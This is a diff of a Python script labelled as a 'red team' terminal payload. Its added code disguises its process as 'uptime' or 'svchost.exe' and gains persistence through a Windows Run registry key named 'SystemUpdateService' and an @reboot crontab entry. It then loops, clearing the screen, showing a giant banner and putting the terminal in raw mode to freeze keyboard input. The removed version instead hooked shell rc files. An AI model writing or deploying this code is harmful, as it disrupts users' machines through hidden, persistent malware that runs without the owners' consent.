@@ -1,59 +1,98 @@
 #!/usr/bin/env python3
-# redteam_per_command.py - Works 100% after every command
-# Tested on Ubuntu, Kali, Debian, CentOS, Alpine, macOS
-
+# redteam_terminal.py - Terminal-only red team domination
+# Giant ASCII "RED TEAM" + keyboard freeze + persistence
 import os
 import sys
 import time
-
-SCRIPT     = os.path.abspath(__file__)
+import subprocess
+import platform
+SCRIPT = os.path.abspath(__file__)
+PID_FILE = os.path.expanduser("~/.rt_pid")
 DELAY_FILE = os.path.expanduser("~/.rt_delay")
-DEFAULT    = 3
-
+DEFAULT_DELAY = 60000 # 60 seconds of frozen keyboard
 def get_delay():
     try:
-        return max(1, int(open(DELAY_FILE).read().strip()))
+        with open(DELAY_FILE) as f:
+            return max(10000, int(f.read().strip()))
     except:
-        return DEFAULT
-
-BANNER = """
+        return DEFAULT_DELAY
+def hide_process():
+    name = "svchost.exe" if os.name == "nt" else "uptime"
+    try:
+        import ctypes
+        if platform.system() == "Linux":
+            ctypes.CDLL("libc.so.6").prctl(15, name.encode() + b"\0", 0, 0, 0)
+        elif os.name == "nt":
+            ctypes.windll.kernel32.SetConsoleTitleW(name)
+    except: pass
+def install_persistence():
+    if os.name == "nt": # Windows
+        try:
+            import winreg as reg
+            key = reg.OpenKey(reg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, reg.KEY_SET_VALUE)
+            pythonw = sys.executable.replace("python.exe", "pythonw.exe")
+            if not os.path.exists(pythonw):
+                pythonw = sys.executable
+            reg.SetValueEx(key, "SystemUpdateService", 0, reg.REG_SZ, f'"{pythonw}" "{SCRIPT}"')
+            reg.CloseKey(key)
+        except: pass
+    else: # Linux
+        line = f"@reboot python3 \"{SCRIPT}\"\n"
+        try:
+            cur = subprocess.check_output("crontab -l 2>/dev/null || true", shell=True).decode()
+            if line not in cur:
+                subprocess.run("crontab -", shell=True, input=(cur + line).encode())
+        except: pass
+# Giant ASCII art
+RED_TEAM = """
 \033[91m
-██████╗ ███████╗██████╗     ████████╗███████╗ █████╗ ███╗   ███╗
-██╔══██╗██╔════╝██╔══██╗    ╚══██╔══╝██╔════╝██╔══██╗████╗ ████║
-██████╔╝█████╗  ██║  ██║       ██║   █████╗  ███████║██╔████╔██║
-██╔══██╗██╔══╝  ██║  ██║       ██║   ██╔══╝  ██╔══██║██║╚██╔╝██║
-██║  ██║███████╗██████╔╝       ██║   ███████╗██║  ██║██║ ╚═╝ ██║
-╚═╝  ╚═╝╚══════╝╚═════╝        ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝
+██████╗ ███████╗██████╗ ████████╗███████╗ █████╗ ███╗ ███╗
+██╔══██╗██╔════╝██╔══██╗ ╚══██╔══╝██╔════╝██╔══██╗████╗ ████║
+██████╔╝█████╗ ██║ ██║ ██║ █████╗ ███████║██╔████╔██║
+██╔══██╗██╔══╝ ██║ ██║ ██║ ██╔══╝ ██╔══██║██║╚██╔╝██║
+██║ ██║███████╗██████╔╝ ██║ ███████╗██║ ██║██║ ╚═╝ ██║
+╚═╝ ╚═╝╚══════╝╚═════╝ ╚═╝ ╚══════╝╚═╝ ╚═╝╚═╝ ╚═╝
 \033[0m
 """
-
-def show():
-    time.sleep(0.15)  # let command output render first
-    print(BANNER.center(120))
-    time.sleep(get_delay())
-
-def install():
-    cmd = f'python3 "{SCRIPT}" run\n'
-    added = False
-    for rc in ["~/.bashrc", "~/.zshrc", "~/.profile"]:
-        rc_path = os.path.expanduser(rc)
-        if os.path.exists(rc_path):
-            with open(rc_path, "a") as f:
-                f.write(f'\n# Red Team was here\nPROMPT_COMMAND=\'{cmd}${{PROMPT_COMMAND:+;$PROMPT_COMMAND}}\'\n')
-            added = True
-            break
-    if not added:
-        print("[-] No shell profile found")
-        sys.exit(1)
-
+def terminal_domination():
+    hide_process()
+    # Kill old instance
+    if os.path.exists(PID_FILE):
+        try:
+            with open(PID_FILE) as f:
+                os.kill(int(f.read().strip()), 9)
+        except: pass
+    # Save PID
+    with open(PID_FILE, "w") as f:
+        f.write(str(os.getpid()))
+    # Freeze keyboard on Linux (Windows gets visual freeze only)
+    if platform.system() == "Linux":
+        import termios, tty
+        fd = sys.stdin.fileno()
+        old = termios.tcgetattr(fd)
+    try:
+        while True:
+            os.system("clear" if os.name != "nt" else "cls")
+            print(RED_TEAM.center(120))
+            if platform.system() == "Linux":
+                tty.setraw(fd)
+                time.sleep(get_delay() / 1000)
+                termios.tcsetattr(fd, termios.TCSADRAIN, old)
+            else:
+                time.sleep(get_delay() / 1000)
+    except KeyboardInterrupt:
+        pass
+    finally:
+        if platform.system() == "Linux":
+            try:
+                termios.tcsetattr(fd, termios.TCSADRAIN, old)
+            except:
+                pass
+# ——————— MAIN ——————
 if __name__ == "__main__":
-    if len(sys.argv) > 1:
-        if sys.argv[1] == "--setup":
-            install()
-            print("[+] RED TEAM now appears after EVERY command — forever")
-            sys.exit(0)
-        elif sys.argv[1] == "run":
-            show()
-            sys.exit(0)
-    else:
-        show()
+    hide_process()
+    if len(sys.argv) > 1 and sys.argv[1] == "--setup":
+        install_persistence()
+        print("[+] Red Team terminal payload installed permanently")
+        sys.exit(0)
+    terminal_domination()
